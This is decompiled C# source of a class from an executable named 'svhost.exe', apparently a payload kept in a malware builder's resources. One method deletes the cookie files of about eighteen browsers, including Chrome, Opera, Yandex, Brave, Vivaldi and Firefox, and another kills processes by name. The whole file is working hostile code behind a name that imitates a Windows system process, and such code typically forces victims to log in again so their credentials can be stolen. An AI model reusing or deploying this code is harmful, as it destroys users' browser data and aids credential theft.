// Decompiled with JetBrains decompiler
// Type: svhost.clear_cookies
// Assembly: svhost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7DC793DB-CF4C-4ECD-BC3A-2E8425BD618A
// Assembly location: C:\Users\matze\Desktop\Neuer Ordner (7)\Builder\Builder\Resources\svhost.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace svhost
{
  [StandardModule]
  internal sealed class clear_cookies
  {
    public static void cls_cookies()
    {
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Google\\Chrome\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Google(x86)\\Chrome\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Google(x86)\\Chrome\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Roaming\\Opera Software\\Opera Stable\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Roaming\\Opera Software\\Opera Stable\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Amigo\\User\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Amigo\\User\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Torch\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Torch\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Orbitum\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Orbitum\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Comodo\\Dragon\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Comodo\\Dragon\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Vivaldi\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Vivaldi\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Slimjet\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Slimjet\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\360Browser\\Browser\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\360Browser\\Browser\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Maxthon3\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Maxthon3\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\K-Melon\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\K-Melon\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Nichrome\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Nichrome\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Nichrome\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Nichrome\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Mail.Ru\\Atom\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Mail.Ru\\Atom\\User Data\\Default\\Cookies");
      if (File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Epic Privacy Browser\\Atom\\User Data\\Default\\Cookies"))
        File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Local\\Epic Privacy Browser\\Atom\\User Data\\Default\\Cookies");
      if (!File.Exists(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Roaming\\Mozilla\\Firefox\\Profiles\\nahd6ha2.default\\cookies.sqlite"))
        return;
      File.Delete(Microsoft.VisualBasic.Strings.Replace(folderPath, ((IEnumerable<string>) folderPath.Split('\\')).Last<string>(), "") + "\\Roaming\\Mozilla\\Firefox\\Profiles\\nahd6ha2.default\\cookies.sqlite");
    }

    public static void kill_prog(string name_prog)
    {
      Process[] processes = Process.GetProcesses();
      int index = 0;
      while (index < processes.Length)
      {
        Process process = processes[index];
        if (Operators.CompareString(process.ProcessName, name_prog, false) == 0)
          process.Kill();
        checked { ++index; }
      }
    }
  }
}
